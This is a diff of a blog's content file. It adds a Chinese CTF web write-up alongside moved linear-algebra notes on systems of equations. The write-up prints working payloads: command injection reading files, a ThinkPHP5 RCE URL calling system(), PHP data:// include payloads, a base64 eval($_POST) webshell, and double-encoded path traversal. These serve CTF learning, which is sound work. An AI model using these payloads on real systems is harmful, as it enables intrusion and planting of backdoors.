+<h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>提示ip地址为123.123.123.123<br>该题掌握X-Forwarded-For和Referer的知识：<br>简称XFF，代表客户端，是HTTP的请求端真实的IP。<br>Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。<br>用bp抓包修改<br>右键送到Repeater，添加X-Forwarded-For:123.123.123.123，go，显示如下页面<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/11.png" alt="d0eab203ed63605eade4469542c943dc.png"><br>还要构造referer。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/12.png" alt="5a7243e1dbb8e1ec66250fa2b5be76c3.png"><br>得出flag。</p>
+<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>这道题就是菜刀的基本使用。<br>打开菜刀输入url，<img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/13.png" alt="f9713fc76cf46bad206a7058fe79d3e5.png"><br>打开flag.txt得到flag。</p>
+<h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h3><p>这是命令执行漏洞，也就是用户通过浏览器在远程服务器上执行任意系统命令，这是第一次接触。参考了网上的wp。<br>先试一下本机127.0.0.1，有回显。<img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/14.png" alt="5552db0ea1c328d3cd82b16311af227b.png"><br>这个是可以添加连接符的，比如&amp;&amp;||等，这里试一下输入127.0.0.1&amp;&amp;dir<br>dir就是显示目录内容。<img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/15.png" alt="25da5b930a0600f6a16b047bd5ae061a.png"><br>回显有index.php<br>然后试试输入flag关键词</p>
+<blockquote>
+<p>127.0.0.1 &amp;&amp; find / -name “flag.*”</p>
+</blockquote>
+<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/16.png" alt="26fb9ef994a699ca100e4f2ba704627d.png"></p>
+<p>找到位置，然后开始输入</p>
+<blockquote>
+<p>127.0.0.1 &amp;&amp; cat /home/flag.txt</p>
+</blockquote>
+<p>得到flag。</p>
+<h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>查看源代码，是js代码。整理一下。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/17.png" alt="4be7a3fec6b950d9c10e7bb8c5ad816d.png"><br>代码功能是把一串用逗号分隔的数字按ascii转成字符串，然后输出。</p>
+<p>代码有很多没有用的变量，需要进行修改。<br>代码中有这样的ascii串，</p>
+<blockquote>
+<p>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</p>
+</blockquote>
+<p>转码后为55,56,54,79,115,69,114,116,107,49,50<br>再通过ascii转换<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/18.png" alt="281beda85aabf6c406af0984f3958bfb.png"><br>连起来就是flag。</p>
+<h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>提示说初始页面，想到index.html,不行又试了试index.php，到network里边响应头找到flag。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/19.png" alt="bf357a9dcbe4bc5f3b6c6ce1ebe5889f.png"></p>
+<h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>提示robots，先看看robots文件，<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/20.png" alt="4a00ff9dcd6407567359d55d029b173a.png"><br>有个fl0g.php，打开看看。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/21.png" alt="dafa7304aed10e61657aba39dc534c5a.png"><br>得到flag。</p>
+<h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p>打开试了半天，不知道是干哈的，没办法，搜一下吧。是thinkphp5 rce漏洞，这个以前没有见过。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/22.png" alt="6c7f65ceff78de22ac1b3536a1421eec.png"><br><a href="https://blog.csdn.net/qq_40884727/article/details/101452478">ThinkPHP5.x rec漏洞分析与复现</a><br>先看一下thinkphp的版本号，然后对症下药。<br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/23.png" alt="71744c42f55e1c06d4fc2725917d0ca7.png"><br>然后去百度查找该版本poc。<br>查找flag，构造payload</p>
+<blockquote>
+<p><a href="http://111.198.29.45:53630/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22flag%22">http://111.198.29.45:53630/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22flag%22</a></p>
+</blockquote>
+<p>然后查看flag</p>
+<blockquote>
+<p><a href="http://111.198.29.45:53630/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22flag%22">http://111.198.29.45:53630/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22flag%22</a></p>
+</blockquote>
+<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/24.png" alt="0bd59f138ff2510526a68df393e9c74d.png"></p>
+<h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>php函数</p>
+<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/25.png" alt="623abf7bde3354bcbec59c622035b03a.png"></p>
+<p>可知程序过滤掉了page=参数传入php://</p>
+<p><strong>第一种方法（大小写绕过）：</strong></p>
+<blockquote>
+<p>strstr() 搜索字符串在另一字符串的第一次出现（区分大小写）。</p>
+<p>str_replace() 以其他字符替换字符串中的一些字符（区分大小写）。</p>
+</blockquote>
+<p>根据strstr的区分大小写，构造</p>
+<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/26.png" alt="5c39025de563306dd04b59f4b2590ed7.png"><br><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/27.png" alt="85848961451ec6ac1dfb4bc5b0d32246.png"></p>
+<p>然后查看flag</p>
+<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/28.png" alt="8f1f7571cd26368cbe3ef524ac709ce7.png"></p>
+<p><strong>第二种（data://伪协议执行命令利用）</strong></p>
+<p>该题过滤了php://伪协议，可以使用其他协议，使用data://伪协议<br><em>data://伪协议</em><br>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是php代码，就会执行代码。<br>使用方法：</p>
+<blockquote>
+<p>data://text/plain;base64,xxxx(base64编码后的数据)</p>
+</blockquote>
+<p>&lt;?php system(“dir”)?&gt; base64编码后使用</p>
+<blockquote>
+<p><a href="http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIiKT8%2b">http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIiKT8%2b</a></p>
+</blockquote>
+<p>注意编码后+号要用url编码<br>&lt;?php system(“cat fl4gisisish3r3.php”)?&gt; base64编码后使用</p>
+<blockquote>
+<p><a href="http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==">http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==</a></p>
+</blockquote>
+<p>查看源代码可得到flag。</p>
+<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/29.png" alt="bf9fad42f730d52e509a19a34852fd96.png"></p>
+<p><strong>第三种方法(data://伪协议传木马）</strong></p>
+<p>&lt;?php eval($_POST[xiaohua]); ?&gt; base64加密后拼接</p>
+<blockquote>
+<p><a href="http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgZXZhbCgkX1BPU1RbeGlhb2h1YV0pOyA/Pg==">http://111.198.29.45:32386/?page=data://text/plain/;base64,PD9waHAgZXZhbCgkX1BPU1RbeGlhb2h1YV0pOyA/Pg==</a></p>
+</blockquote>
+<p>菜刀连接（这个我连接时没有出现flag，可能不可行）</p>
+<h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><p>打开是一个网址，点一遍后，发现只有报表中心跳转，进入了一个新页面。</p>
+<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/30.png" alt="e67caa63d8e5e1491213a85b291cafd8.png"></p>
+<p>注意那个id，这个是爆破，打开bp，然后选择数字，先从1到10000跑跑试试。</p>
+<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/31.png" alt="4c130f95e90194ed830347cc9c0a8559.png"></p>
+<p>然后得出2333。将id改为2333，得出flag。</p>
+<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>f12提示source.php,打开<img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/32.png" alt="ee16fb77a84e65023ab55faa42f75dda.png"><br>还有个hint.php</p>
+<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/33.png" alt="97468ca3d7f89f97cf74091854e0aba3.png"></p>
+<p>知道应该在这个ffffllllaaaagggg<br>接下来就是找这个文件了<br><strong>代码审计</strong><br>checkfile()函数</p>
+<ol>
+<li>定义了一个白名单：source.php和hint.php，判断$page是否为空、是否为字符串。</li>
+<li>判断$page是否在白名单里，若存在返回true；</li>
+<li>考虑到page有参数的情况，$_page是取出$page问号前的东西，然后再判断$_page是否在白名单里，若存在则返回true；</li>
+<li>如果上一步判断失败，则又考虑了url编码的问题，因为url在传入以后服务器会自动进行一次解码。因此传入二次编码后的内容，就可以使checkfile返回true。</li>
+</ol>
+<p>接下来就是一个一个试了</p>
+<blockquote>
+<p>mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string</p>
+</blockquote>
+<p>根据字符数执行一个多字节安全的 substr() 操作。 位置是从 str 的开始位置进行计数。 第一个字符的位置是 0。第二个字符的位置是 1，以此类推。</p>
+<blockquote>
+<p>mb_strpos ( string $haystack , string $needle [, int $offset = 0 [, string $encoding = mb_internal_encoding() ]] ) : int</p>
+</blockquote>
+<p>查找 string 在一个 string 中首次出现的位置。<br>第三个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：<br>最终在这样构造url得到：</p>
+<blockquote>
+<p><a href="http://111.198.29.45:34231/source.php?file=source.php%253f../../../../../ffffllllaaaagggg">http://111.198.29.45:34231/source.php?file=source.php%253f../../../../../ffffllllaaaagggg</a></p>
+</blockquote>
+<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/34.png" alt="8e9e5cfa2a8b6ed1f577273f92ae4eda.png"></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -2932,6 +2932,83 @@ A+(-A)=O</script></li>
       </tags>
   </entry>
   <entry>
+    <title>线性代数-线性方程组</title>
+    <url>/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/</url>
+    <content><![CDATA[<h2 id="线性方程组"><a href="#线性方程组" class="headerlink" title="线性方程组"></a>线性方程组</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>我们称</p>
+<script type="math/tex; mode=display">\begin{cases}
+    a_{11}x_1+a_{12}x_2+\dotsb+a_{1n}x_n=b_1\\
+    a_{21}x_1+a_{22}x_2+\dotsb+a_{2n}x_n=b_2\\
+    \dotsb \\
+    a_{m1}x_1+a_{m2}x_2+\dotsb+a_{mn}x_n=b_m
+\end{cases}\tag{I}</script><p>是 n 个未知数 m 个方程的<em>非齐次线性方程组</em>，其中$x_1,x_2,\dotsb,x_n$代表 n 个未知数，而$b_1,b_2,\dotsb,b_m$是不全为0的常数</p>
+<span id="more"></span>
+<p>利用矩阵乘法，方程组(I)可表示法：</p>
+<script type="math/tex; mode=display">\begin{bmatrix}
+    a_{11} &a_{12} &\dotsb &a_{1n} \\
+    a_{21} &a_{22} &\dotsb &a_{2n} \\
+    \vdots &\vdots &\vdots & \\
+    a_{m1} &a_{m2} &\dotsb &a_{mn}
+\end{bmatrix}\begin{bmatrix}
+    x_1 \\
+    x_2 \\
+    \vdots \\
+    x_n
+\end{bmatrix}=\begin{bmatrix}
+    b_1 \\
+    b_2 \\
+    \vdots \\
+    b_m
+\end{bmatrix}</script><p>于是方程组(I)的矩阵形式：$Ax=b$称 A 为方程组(I)的系数矩阵</p>
+<p>对矩阵 A 按列分块，记 $A=(\alpha_1,\alpha_2,\dotsb,\alpha_n)$ 则方程组(I)有向量形式 $x_1\alpha_1+x_2\alpha_2+\dotsb+x_n\alpha_n=\beta$ 其中$a_j=(a_{1j},a_{2j},\dotsb,a_{nj})^T,j=1,2,\dotsb,n,\beta=(b_1,b_2,\dotsb,b_m)^T$<br>如果$\forall j=1,2,\dotsb,m$ 恒有 $b_j=0$ ，则称</p>
+<script type="math/tex; mode=display">\begin{cases}
+    a_{11}x_1+a_{12}x_2+\dotsb+a_{1n}x_n=0\\
+    a_{21}x_1+a_{22}x_2+\dotsb+a_{2n}x_n=0\\
+    \dotsb \\
+    a_{m1}x_1+a_{m2}x_2+\dotsb+a_{mn}x_n=0
+\end{cases}\tag{II}</script><p>为<em>齐次线性方程组</em>。其矩阵形式为 $Ax=0$<br>齐次方程组(II)的向量形式为$x_1\alpha_1+x_2\alpha_2+\dotsb+x_n\alpha_n=0$<br>若将一组数 $c_1,c_2,\dotsb,c_n$ 分别代替方程组(I)（或(II)中的$x_1,x_2,\dotsb,x_n$）使(I)（或(II)）中 m 个等式都成立，则称$c_1,c_2,\dotsb,c_n)^T$是方程组(I)（或(II)）的一个解</p>
+<p>求方程组的解就是要对所给方程组作同解变形，而同解变形的方法：</p>
+<ol>
+<li>两个方程互换位置</li>
+<li>用非零常数乘方程的两端</li>
+<li>把某个方程的 k 倍加到另一个方程上</li>
+</ol>
+<h3 id="线性方程组解的基本定理"><a href="#线性方程组解的基本定理" class="headerlink" title="线性方程组解的基本定理"></a>线性方程组解的基本定理</h3><p><strong>定理1</strong> 设 A 为 $m\times n$矩阵，则<br>(1)齐次线性方程组 $AX=0$ 只有零解的充分必要条件是 $r(A)=n$<br>(2)齐次线性方程组 $AX=0$ 有非零解（或有无数个解）的充分必要条件是 $r(A)&lt;n$</p>
+<p><strong>推论1</strong> 设 A 为 n 阶，则<br>(1)齐次线性方程组 $AX=0$ 只有零解的充分必要条件是 $|A|\ne0$<br>(2)齐次线性方程组 $AX=0$ 有非零解（或无数个解）的充分必要条件是 $|A|=0$<br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/线性方程定理1.1.png" alt="图片"><br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/线性方程定理1.2.png" alt="图片"><br><strong>定理2</strong> 设 A 是 $m\times n$，增广矩阵 $\overline{A}=(A\vdots b)$，则<br>(1)非齐次线性方程组 $AX=b$ 有解的充分必要条件是 $r(A)=r(\overline{A})$，其中当 $r(A)=r(\overline{A})=n$ 时，非齐次线性方程组 $AX=b$ 有唯一解；当 $r(A)=r(\overline{A})&lt;n$ 时，非齐次线性方程组$AX=b$有无数个解<br>(2)非齐次线性方程组 $AX=0$ 无解的充分必要条件是 $r(A)\ne r(\overline{A})$</p>
+<p><strong>推论2</strong> 设 A 是 n 阶矩阵，则<br>(1) 非齐次线性方程组 $AX=b$ 有解的充分必要条件是 $r(A)=r(\overline{A})$，其中当$|A|\ne0$时，方程组有唯一解；当$|A|=0$时，方程组有无数个解<br>(2)非齐次线性方程组 $AX=b$ 无解的充分必要条件是 $r(A)\ne r(\overline{A})$<br>(3 设$A_{m\times n}$，若$r(A)=m$(即行满秩)，则非齐次线性方程组$Ax=b$有解。事实上，此时$r(A)=r(A,b)=m$，所以$Ax=b$有解<br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/线性方程定理2.1.png" alt="图片"><br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/线性方程定理22.png" alt="图片"></p>
+<h3 id="线性方程组解的结构"><a href="#线性方程组解的结构" class="headerlink" title="线性方程组解的结构"></a>线性方程组解的结构</h3><ol>
+<li>设 $X_1,X_2,\dotsb,X_s$ 为齐次线性方程组 $AX=0$ 的一组解，则 $k_1X_1+k_2X_2+\dotsb+k_sX_s$ 也为齐次线性方程组 $AX=0$ 的解，其中 $k_1,k_2,\dotsb,k_s$ 为任意常数</li>
+<li>设 $\eta_0$ 为非齐次线性方程组 $AX=b$ 的一个解，$X_1,X_2,\dotsb,X_s$ 为齐次线性方程组 $AX=0$ 的一组解，则 $k_1X_1+k_2X_2+\dotsb+k_sX_s+\eta_0$ 为非齐次线性方程组 $AX=b$ 的解</li>
+<li>设 $\eta_1,\eta_2$ 为非齐次线性方程组 $AX=b$ 的两个解，则 $\eta_2-\eta_1$ 为齐次线性方程组 $AX=0$ 的一个解</li>
+<li>设 $\xi$ 是方程组 $Ax=b$ 的解，$\eta$ 是导出组 $Ax=0$ 的解，k 是任意常数，则 $\xi+k\eta$ 是方程组 $Ax=b$ 的解</li>
+<li>设 $X_1,X_2,\dotsb,X_s$ 为非齐次线性方程组 $AX=b$ 的一组解，则 $k_1X_1+k_2X_2+\dotsb+k_sX_s$ 为 $AX=b$ 的解的充分必要条件是 $k_1+k_2+\dotsb+k_s=1$</li>
+<li>设 $\eta_1,\eta_2,\dotsb,\eta_s$ 为非齐次线性方程组 $AX=b$ 的一组解，则 $k_1\eta_1+k_2\eta_2+\dotsb+k_s\eta_s$ 为齐次线性方程组 $AX=0$ 的解的充分必要条件是 $k_1+k_2+\dotsb+k_s=0$</li>
+</ol>
+<h3 id="线性方程组的通解"><a href="#线性方程组的通解" class="headerlink" title="线性方程组的通解"></a>线性方程组的通解</h3><h4 id="齐次线性方程组-AX-0-的基础解系与通解"><a href="#齐次线性方程组-AX-0-的基础解系与通解" class="headerlink" title="齐次线性方程组 $AX=0$ 的基础解系与通解"></a>齐次线性方程组 $AX=0$ 的基础解系与通解</h4><ol>
+<li><p>基础解系——设$r(A)=r&lt;n$，则$AX=0$所有解构成的解向量组的极大线性无关组成为方程组$AX=0$的一个基础解系。当$r(A)=r$时，$AX=0$的基础解系所含的线性无关的解向量的个数为$n-r$个</p>
+<pre><code> 设A为$m\times n$矩阵，且$r(A)=r&lt;n$,所谓$AX=0$的基础解系，即满足如下三个条件的向量组
+ (1)该向量组中每个向量都是$AX=0$的解；
+ (2)该向量组线性无关；
+ (3)该向量组所含解向量的个数等于$nーr$
+</code></pre></li>
+<li><p>通解——设$\xi_1,\xi_2,\dotsb,\xi_{n-r}$为齐次线性方程组$AX=0$的一个基础解系，则称$k\xi_1+k_2\xi_2+\dotsb+k_{n-r}\xi_{n-r}$为齐次线性方程组$AX=0$的通解，其中$k_1,k_2,\dotsb,k_{n-r}$为任意常数</p>
+</li>
+</ol>
+<h4 id="非齐次线性方程组-AX-b-的通解"><a href="#非齐次线性方程组-AX-b-的通解" class="headerlink" title="非齐次线性方程组 $AX=b$的通解"></a>非齐次线性方程组 $AX=b$的通解</h4><p>设$r(A)=r(\overline{A})=r&lt;n$且$\xi_1,\xi_2,\dotsb,\xi_{n-r}$为$AX=b$的导出方程组$AX=0$的一个基础解系，$\eta_0$为$AX=b$的一个解，则$AX=b$的通解为$k\xi_1+k_2\xi_2+\dotsb+k_{n-r}\xi_{n-r}+\eta_0$，其中$k_1,k_2,\dotsb,k_{n-r}$为任意常数<br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/非线性方程组通解注解.png" alt="图片"></p>
+<h3 id="方程组解的理论延伸"><a href="#方程组解的理论延伸" class="headerlink" title="方程组解的理论延伸"></a>方程组解的理论延伸</h3><ol>
+<li>设 $A$ 是 $m\times n$矩阵，B是$n\times s$矩阵，若$AB=0$，则B的列向量组为方程组$AX=0$的解</li>
+<li>设方程组$AX=0$与$BX=0$为同解方程组，则$r(A)=r(B)$,反之不对</li>
+<li>设方程组$AX=0$的解为$BX=0$的解，则$r(A)\ge r(B)$<br> 1.若方程组$AX=0$的解为方程组$BX=0$的解，但方程组$BX=0$的解不全是方程组$AX=0$的解，则$r(A)&gt;r(B)$<br> 2.若方程纽$AX=0$的解为方程组$BX=0$的解，且$r(A)=r(B)$,则方程组$AX=0$与方程组$BX=0$同解</li>
+<li>设<script type="math/tex">AX=b\tag{I}$$$$BX=c\tag{II}</script>则线性方程组$(\overset{A}{B})X=(\overset{b}{c})$的解即为线性方程组(I)和(II)的解</li>
+</ol>
+]]></content>
+      <categories>
+        <category>数学</category>
+      </categories>
+      <tags>
+        <tag>线性代数</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>线性代数-矩阵的特征值和特征向量</title>
     <url>/2021/05/06/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E7%89%B9%E5%BE%81%E5%80%BC%E5%92%8C%E7%89%B9%E5%BE%81%E5%90%91%E9%87%8F/</url>
     <content><![CDATA[<h2 id="特征值与特征向量"><a href="#特征值与特征向量" class="headerlink" title="特征值与特征向量"></a>特征值与特征向量</h2><h3 id="特征值与特征向量的理论背景"><a href="#特征值与特征向量的理论背景" class="headerlink" title="特征值与特征向量的理论背景"></a>特征值与特征向量的理论背景</h3><p>在一个多项式中，未知数的个数为任意多个，且每一项次数都是2的多项式称为二次型，二次型分为两种类型：即非标准二次型及标准二次型。<br><img src="/2021/05/06/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E7%89%B9%E5%BE%81%E5%80%BC%E5%92%8C%E7%89%B9%E5%BE%81%E5%90%91%E9%87%8F/背景.png" alt="图片"></p>
@@ -3029,83 +3106,6 @@ A+(-A)=O</script></li>
     |\lambda E-A|=|\lambda E-B| \\
     A与B有相同的特征值
 \end{cases}</script>]]></content>
-      <categories>
-        <category>数学</category>
-      </categories>
-      <tags>
-        <tag>线性代数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>线性代数-线性方程组</title>
-    <url>/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/</url>
-    <content><![CDATA[<h2 id="线性方程组"><a href="#线性方程组" class="headerlink" title="线性方程组"></a>线性方程组</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>我们称</p>
-<script type="math/tex; mode=display">\begin{cases}
-    a_{11}x_1+a_{12}x_2+\dotsb+a_{1n}x_n=b_1\\
-    a_{21}x_1+a_{22}x_2+\dotsb+a_{2n}x_n=b_2\\
-    \dotsb \\
-    a_{m1}x_1+a_{m2}x_2+\dotsb+a_{mn}x_n=b_m
-\end{cases}\tag{I}</script><p>是 n 个未知数 m 个方程的<em>非齐次线性方程组</em>，其中$x_1,x_2,\dotsb,x_n$代表 n 个未知数，而$b_1,b_2,\dotsb,b_m$是不全为0的常数</p>
-<span id="more"></span>
-<p>利用矩阵乘法，方程组(I)可表示法：</p>
-<script type="math/tex; mode=display">\begin{bmatrix}
-    a_{11} &a_{12} &\dotsb &a_{1n} \\
-    a_{21} &a_{22} &\dotsb &a_{2n} \\
-    \vdots &\vdots &\vdots & \\
-    a_{m1} &a_{m2} &\dotsb &a_{mn}
-\end{bmatrix}\begin{bmatrix}
-    x_1 \\
-    x_2 \\
-    \vdots \\
-    x_n
-\end{bmatrix}=\begin{bmatrix}
-    b_1 \\
-    b_2 \\
-    \vdots \\
-    b_m
-\end{bmatrix}</script><p>于是方程组(I)的矩阵形式：$Ax=b$称 A 为方程组(I)的系数矩阵</p>
-<p>对矩阵 A 按列分块，记 $A=(\alpha_1,\alpha_2,\dotsb,\alpha_n)$ 则方程组(I)有向量形式 $x_1\alpha_1+x_2\alpha_2+\dotsb+x_n\alpha_n=\beta$ 其中$a_j=(a_{1j},a_{2j},\dotsb,a_{nj})^T,j=1,2,\dotsb,n,\beta=(b_1,b_2,\dotsb,b_m)^T$<br>如果$\forall j=1,2,\dotsb,m$ 恒有 $b_j=0$ ，则称</p>
-<script type="math/tex; mode=display">\begin{cases}
-    a_{11}x_1+a_{12}x_2+\dotsb+a_{1n}x_n=0\\
-    a_{21}x_1+a_{22}x_2+\dotsb+a_{2n}x_n=0\\
-    \dotsb \\
-    a_{m1}x_1+a_{m2}x_2+\dotsb+a_{mn}x_n=0
-\end{cases}\tag{II}</script><p>为<em>齐次线性方程组</em>。其矩阵形式为 $Ax=0$<br>齐次方程组(II)的向量形式为$x_1\alpha_1+x_2\alpha_2+\dotsb+x_n\alpha_n=0$<br>若将一组数 $c_1,c_2,\dotsb,c_n$ 分别代替方程组(I)（或(II)中的$x_1,x_2,\dotsb,x_n$）使(I)（或(II)）中 m 个等式都成立，则称$c_1,c_2,\dotsb,c_n)^T$是方程组(I)（或(II)）的一个解</p>
-<p>求方程组的解就是要对所给方程组作同解变形，而同解变形的方法：</p>
-<ol>
-<li>两个方程互换位置</li>
-<li>用非零常数乘方程的两端</li>
-<li>把某个方程的 k 倍加到另一个方程上</li>
-</ol>
-<h3 id="线性方程组解的基本定理"><a href="#线性方程组解的基本定理" class="headerlink" title="线性方程组解的基本定理"></a>线性方程组解的基本定理</h3><p><strong>定理1</strong> 设 A 为 $m\times n$矩阵，则<br>(1)齐次线性方程组 $AX=0$ 只有零解的充分必要条件是 $r(A)=n$<br>(2)齐次线性方程组 $AX=0$ 有非零解（或有无数个解）的充分必要条件是 $r(A)&lt;n$</p>
-<p><strong>推论1</strong> 设 A 为 n 阶，则<br>(1)齐次线性方程组 $AX=0$ 只有零解的充分必要条件是 $|A|\ne0$<br>(2)齐次线性方程组 $AX=0$ 有非零解（或无数个解）的充分必要条件是 $|A|=0$<br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/线性方程定理1.1.png" alt="图片"><br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/线性方程定理1.2.png" alt="图片"><br><strong>定理2</strong> 设 A 是 $m\times n$，增广矩阵 $\overline{A}=(A\vdots b)$，则<br>(1)非齐次线性方程组 $AX=b$ 有解的充分必要条件是 $r(A)=r(\overline{A})$，其中当 $r(A)=r(\overline{A})=n$ 时，非齐次线性方程组 $AX=b$ 有唯一解；当 $r(A)=r(\overline{A})&lt;n$ 时，非齐次线性方程组$AX=b$有无数个解<br>(2)非齐次线性方程组 $AX=0$ 无解的充分必要条件是 $r(A)\ne r(\overline{A})$</p>
